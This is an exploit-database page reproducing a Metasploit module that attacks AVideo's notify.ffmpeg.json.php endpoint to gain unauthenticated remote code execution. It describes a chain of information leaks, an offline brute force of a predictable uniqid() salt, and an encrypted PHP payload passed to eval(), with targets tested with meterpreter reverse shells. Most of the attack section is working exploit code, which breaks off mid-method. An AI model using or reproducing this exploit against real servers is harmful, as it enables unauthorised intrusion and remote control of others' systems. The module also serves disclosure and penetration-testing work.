---
title: AVideo Notify.ffmpeg.json.php Unauthenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026010010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-18
fetch_date: 2026-01-19T03:34:42.799777
---

# AVideo Notify.ffmpeg.json.php Unauthenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AVideo Notify.ffmpeg.json.php Unauthenticated Remote Code Execution** **2026.01.18**  Credit:  **[Valentin](https://cxsecurity.com/author/Valentin/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'openssl'
require 'time'
require 'tzinfo'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Payload::Php
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'AVideo notify.ffmpeg.json.php Unauthenticated RCE via Salt Discovery',
'Description' => %q{
This module exploits an unauthenticated remote code execution (RCE) vulnerability
in AVideo's notify.ffmpeg.json.php endpoint. The vulnerability stems from a critical
cryptographic weakness in the salt generation mechanism combined with information
disclosure vulnerabilities that allow an attacker to discover the encryption salt
through offline bruteforce.
Root Cause:
During installation, AVideo generates an encryption salt using PHP's uniqid() function,
which is not cryptographically secure. uniqid() generates a 13-character hexadecimal
string composed of: 8 characters for Unix timestamp in hex, and 5 characters for
microseconds in hex (0x00000 to 0xFFFFF = 1,048,576 possible values).
Exploit Chain:
1. Leak installation timestamp from /objects/categories.json.php (public endpoint)
2. Leak video hashId from /objects/videosAndroid.json.php or /plugin/API/get.json.php
3. Leak system root path from posterPortraitPath in video API responses
4. Leak server timezones from /objects/getTimes.json.php
5. Offline bruteforce of the remaining 5 microsecond characters using hashId comparison
6. Use recovered salt to encrypt RCE payload for notify.ffmpeg.json.php eval()
The notify.ffmpeg.json.php endpoint uses decryptString() to decrypt the callback parameter,
which has a fallback mechanism: if decryption with saltV2 (cryptographically secure) fails,
it retries with the old uniqid() salt. This fallback makes the RCE exploitable.
Affected Versions:
AVideo 14.3.1+ (introduced January 7, 2025). Requires: Fallback mechanism in
encrypt\_decrypt() (introduced January 15, 2024) and notify.ffmpeg.json.php with
eval($callback) (introduced January 7, 2025).
Note on v20.0: The vendor removed the posterPortraitPath leak but did NOT remove
the legacy salt fallback or eval($callback). RCE remains exploitable using SYSTEM\_ROOT.
This vulnerability does not require authentication and can be exploited remotely by any
attacker who can access the AVideo instance.
},
'Author' => [
'Valentin Lobstein <chocapikk[at]leakix.net>' # Discovery and Metasploit module
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2025-34433'], # Unauthenticated RCE via Predictable Salt
['CVE', '2025-34441'], # Information Disclosure: hashId leak
['CVE', '2025-34442'], # Information Disclosure: System Path leak
['URL', 'https://github.com/WWBN/AVideo/pull/10284'],
['URL', 'https://chocapikk.com/posts/2025/avideo-security-vulnerabilities/'],
['URL', 'https://www.vulncheck.com/advisories/avideo-unauthenticated-rce-via-predictable-installation-salt']
],
'Platform' => %w[php unix linux win],
'Arch' => [ARCH\_PHP, ARCH\_CMD],
'Targets' => [
[
'PHP In-Memory',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP
# tested with php/meterpreter/reverse\_tcp
}
],
[
'Unix/Linux Command Shell',
{
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD
# tested with cmd/linux/http/x64/meterpreter/reverse\_tcp
}
],
[
'Windows Command Shell',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD
# tested with cmd/windows/http/x64/meterpreter/reverse\_tcp
}
]
],
'Privileged' => false,
'DisclosureDate' => '2025-12-19',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'The base path to AVideo', '/']),
OptString.new('SALT', [false, 'Known salt (skips bruteforce)', '']),
OptString.new('SYSTEM\_ROOT', [false, 'System root path (fallback if leak fails)', '/var/www/html/AVideo/'])
])
end
def check
gather\_info
return CheckCode::Safe('notify.ffmpeg.json.php not found (requires 14.3.1+)') unless @notify\_exists
salt\_provided = !datastore['SALT'].to\_s.empty?
unless salt\_provided
return CheckCode::Safe('categories.json.php inaccessible (timestamp leak required)') unless @timestamp\_accessible
return CheckCode::Safe('hashId endpoints inaccessible (videosAndroid.json.php or get.json.php required)') unless @hashid\_accessible
end
return CheckCode::Appears("Vulnerable version #{@version} detected") if @version && @version >= Rex::Version.new('14.3.1')
return CheckCode::Safe("Version #{@version} requires 14.3.1+") if @version
CheckCode::Appears('Prerequisites met (version unknown)')
end
def exploit
gather\_info
fail\_with(Failure::Unknown, 'Failed to discover salt') unless discover\_salt
callback\_payload = target['Arch'] == ARCH\_PHP ? payload.encoded : php\_exec\_cmd(payload.encoded)
vprint\_status('Executing payload...')
res = send\_rce\_payload(callback\_payload)
return if session\_created?
if res&.code == 200
vprint\_status("Payload executed (response: #{res.code})")
return
end
error\_msg = parse\_error\_from\_response(res)
fail\_with(Failure::Unknown, error\_msg ? "Exploit failed: #{error\_msg}" : "Unexpected response code: #{res&.code}")
end
def parse\_error\_from\_response(res)
return nil unless res&.body
data = JSON.parse(res.body)
return data['msg'] if data['msg'] && !data['msg'].to\_s.empty?
return 'Unknown error' if data['error'] == true
nil
rescue JSON::ParserError
nil
end
def gather\_info
return if @notify\_exists && @timestamp\_accessible && @hashid\_accessible && @timestamps && @video\_info
vprint\_status('Gathering target information...')
detect\_version
@notify\_exists = check\_notify\_endpoint
@timestamp\_accessible = check\_endpoint('objects/categories.json.php')
@timestamps ||= get\_timestamps i...